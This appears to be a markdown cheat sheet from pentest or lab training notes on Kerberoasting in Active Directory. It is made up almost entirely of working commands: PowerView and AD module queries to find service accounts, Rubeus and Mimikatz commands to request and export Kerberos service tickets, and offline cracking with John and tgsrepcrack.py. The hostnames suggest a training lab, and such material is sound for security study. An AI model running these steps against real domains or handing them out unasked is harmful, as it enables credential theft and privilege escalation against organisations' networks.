## PRivileges Escalation in AD


### Kerberoasting
---

```powershell
# Standard AD User. Get Domain Users SPN. Users that are for services
C:> . PowerView.ps1
C:> Get-DomainUser -SPN

# Using AD Module
C:> Get-ADUser -Filter {ServicePrincipalName ne ""$null ""} -Properties ServicePrincipalName
```
##### Using `Rubeus.exe`
```powershell
# Get kerberos stats
C:> Rubeus.exe /stats

# Use Rubeus to request a TGS for <user>
C:> Rubeus.exe kerberoast /user:<user> /simple /outfile:hashes.txt

# Accounts supporting only RC4 (Gives errors!)
C:> Rubeus.exe kerberoast /stats /rc4opsec
C:> Rubeus.exe kerberoast /user:<user> /simple /rc4opsec

# Kerberoast all possible accounts
C:> Rubeus.exe kerberoast /outfile:hashes.txt                  

# Crack with John
C:> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```
##### Using Mimikatz
```powershell
C:> Add-Type -AssemblyNAme System.IdentityModel

C:> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"

# Dump account hashes to a `.kirbi` fileasd@service_asdasd
C:> . .\Invoke-Mimikatz.ps1
C:> Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack using `tgsrepcrack.py`
C:> python.exe .\tgsrepcrack.py .\<wordlist>.txt .\<exported_file_from_mimikatz>.kirbi
```
